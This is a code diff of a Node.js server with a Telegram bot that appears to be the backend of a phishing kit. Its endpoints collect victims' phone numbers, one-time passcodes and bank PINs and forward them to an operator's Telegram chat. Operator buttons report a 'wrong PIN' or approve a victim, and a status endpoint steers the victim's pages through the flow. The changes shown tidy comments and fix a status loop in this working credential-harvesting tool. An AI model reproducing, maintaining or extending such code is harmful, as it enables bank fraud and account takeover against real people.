@@ -88,7 +88,6 @@ app.post('/api/verify-first-otp', async (req, res) => {
 
     if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
 
-    // Set status to pending_otp1 when they submit the first OTP code
     statusStore[phone] = "pending_otp1";
 
     const otpMessage = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>
@@ -197,7 +196,7 @@ app.post('/api/resend-otp-notification', async (req, res) => {
     }
 });
 
-// -------------------- BANK PIN API (NEW) --------------------
+// -------------------- BANK PIN API --------------------
 app.post('/api/verify-bank-pin', async (req, res) => {
     const { phone, bankPin } = req.body || {};
     const country = "Afghanistan";
@@ -399,18 +398,13 @@ bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
 });
 
-// -------------------- STATUS CHECK (FIXED LOOP) --------------------
+// -------------------- STATUS CHECK (CLEANED) --------------------
 app.get('/api/check-status', (req, res) => {
     const phone = req.query.phone;
     const currentStatus = statusStore[phone] || "pending";
     
+    // Returns the exact status without changing it prematurely behind the scenes
     res.json({ status: currentStatus });
-
-    // FIX: Once Page 6 reads that it has been approved, change it internally 
-    // so Page 7 doesn't accidentally pick up the approval flag and loop!
-    if (currentStatus === "approved") {
-        statusStore[phone] = "idle_waiting_for_otp1";
-    }
 });
 
 // -------------------- SAFE PAGE ROUTE --------------------
